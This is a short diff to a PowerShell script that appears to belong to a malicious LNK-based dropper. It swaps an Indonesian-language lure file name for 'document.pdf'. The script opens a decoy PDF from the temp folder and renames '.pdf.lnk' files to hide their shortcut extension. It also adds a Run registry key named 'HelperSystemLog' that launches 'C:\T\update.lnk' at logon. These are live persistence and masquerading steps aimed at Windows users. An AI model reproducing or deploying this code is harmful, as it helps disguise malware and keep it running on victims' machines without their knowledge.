@@ -1,4 +1,4 @@
-$docpdfname="pengiriman buah apel.pdf";
+$docpdfname="document.pdf";
 echo 1 > $env:tmp\$docpdfname; .$env:tmp\$docpdfname;
 dir *.pdf.lnk | ren -NewName {$_.BaseName};
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "HelperSystemLog" -Value 'C:\T\update.lnk' -Force;
